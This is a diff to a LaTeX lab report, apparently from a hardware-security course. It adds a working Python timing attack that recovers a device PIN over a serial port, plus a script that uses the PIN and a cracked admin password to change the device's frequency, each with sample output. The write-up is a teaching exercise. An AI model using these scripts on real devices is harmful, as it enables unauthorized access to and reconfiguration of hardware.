@@ -43,6 +43,65 @@ Device was protected by a PIN code when running in administrator mode. As first,
 
 % TODO: Add code for timing attack (and maybe also for bruteforce?)
 
+\begin{minipage}{\linewidth}
+  \begin{lstlisting}[
+    style=python,
+    caption={Timig attack on PIN},
+    captionpos=b,
+    label={fig:timing-attack}
+  ]
+  with serial.Serial('/dev/cu.usbserial-142210', 9600, timeout=1) as ser:
+
+    # At the beginning send some random data to make sure connection works.
+    for _ in range(2):
+      ser.write(b'aaa')
+      ser.read(28)
+
+    prefix = b''
+
+    attack_start = time.time()
+
+    # For each iteration add suffixes, start with 000, then 00, and 0
+    # {0..9}000, X{0..9}00, XY{0..9}0
+    # where X, Y are found numbers.
+    suffixes = (b'0' * size for size in range(3, -1, -1))
+    for suffix in suffixes:
+      times = {}
+
+      for idx in map(str, range(10)):
+        value = prefix + idx.encode('utf-8') + suffix
+        print(value, end='\r', flush=True)
+        ser.write(value)
+        start = time.time()
+        ser.read(28)
+        # Log response time for each number.
+        times[idx] = time.time() - start
+
+      # Choose number for which the response time was highest.
+      number = max(times.keys(), key=lambda e: times[e])
+
+      # Add found number to previously found numbers.
+      prefix += number.encode('utf-8')
+
+
+  print(f'{prefix.decode()} found in {time.time() - attack_start:.4}s.')
+
+  \end{lstlisting}
+\end{minipage}
+
+
+\begin{minipage}{\linewidth}
+  \begin{lstlisting}[
+    style=cpp,
+    caption={Output of timing attack program.},
+    captionpos=b,
+    label={fig:master-timing-result}
+  ]
+>>>  python3 timing_pin.py
+5789 found in 2.833s.
+  \end{lstlisting}
+  \end{minipage}
+
 \subsubsection{Retreiving administrator password}
 
 Having PIN number and ,,control PIN'', next task was to hack the administrator password. Using system interface, we've used help command - \texttt{?} - to get controls.
@@ -132,14 +191,66 @@ fee44f690b2d81480f0c628f6105b05a:0.891.1:Wojtek
 % >>> m.hexdigest()
 % 'fee44f690b2d81480f0c628f6105b05a'
 
+
+\begin{minipage}{\linewidth}
+  \begin{lstlisting}[
+    style=python,
+    caption={Changing frequency using found password.},
+    captionpos=b,
+    label={fig:timing-attack}
+  ]
+  import time
+
+  import serial
+
+  def send(connection, data):
+    print(f'Sending {data}.')
+    connection.write(data)
+    time.sleep(0.5)
+    response = connection.readlines()
+    print(f'Got response: {response}')
+    time.sleep(0.5)
+
+
+  def main():
+    with serial.Serial('/dev/cu.usbserial-142210', 9600, timeout=1) as connection:
+
+      for _ in range(2):
+        connection.write(b'aaa')
+        connection.read(28)
+
+      send(connection, b'5789')  # Enter the pin.
+      send(connection, b'c 1234')  # Set new frequency.
+      send(connection, b'0.891.1Wojtek\n')  # Send password.
+      send(connection, b'd')  # Check new frequency.
+
+  if __name__ == "__main__":
+    main()
+  \end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+  \begin{lstlisting}[
+    style=cpp,
+    caption={Output of frequency changing program.},
+    captionpos=b,
+    label={fig:master-arduino-init}
+  ]
+>>> python3 freq_change.py
+Sending b'5789'.
+Got response: [b'CameraKey Driver - 2019\r\n', b'*** ADMIN MODE ***\r\n']
+Sending b'c 1234'.
+Got response: [b"Enter administrator's password: \r\n"]
+Sending b'0.891.1Wojtek\n'.
+Got response: []
+Sending b'd'.
+Got response: [b'1234\r\n']
+  \end{lstlisting}
+  \end{minipage}
+
 \subsection{Additional task - Bluetooth playground}
 
-After solving ,,the camera frequency problem'' we were equipped with Bluetooth module called \texttt{HC-05}. Our goal this time was to setup wireless communication between two PCs. One of the PCs was connected using Bluetooth module attached to Arduino, and the other connected with the Bluetooth module built-in it.
-
-The first task was to setup Bluetooth module on Arduino on the first PC. To communicate Arduino with PC, we've created a simple echo program that retransmitted every byte from USB port into Bluetooth and from Bluetooth into USB port - that made any signal received from Bluetooth to be sent to PC and all the signals from PC sent further to Bluetooth. When the software logic was done, we've setup wire connection between Arduino and Bluetooth module.
-
-HC-05 required the following setup:
-% TODO: Describe connection of HC-05 to Arduino.
+After solving ,,the camera frequency problem'' we were equipped with Bluetooth module called \texttt{HC-05}. Our goal this time was to setup wireless communication between two PCs. One of the PCs was connected using Bluetooth module attached to Arduino, and the other connected with the Bluetooth module built-in it. To communicate Arduino with PC, we've created a simple echo program that retransmitted every byte from USB port into Bluetooth and from Bluetooth into USB port - that made any signal received from Bluetooth to be sent to PC and all the signals from PC sent further to Bluetooth. When the software logic was done, we've setup wire connection between Arduino and Bluetooth module.
 
 \subsubsection{Running in AT mode}
 % TODO:
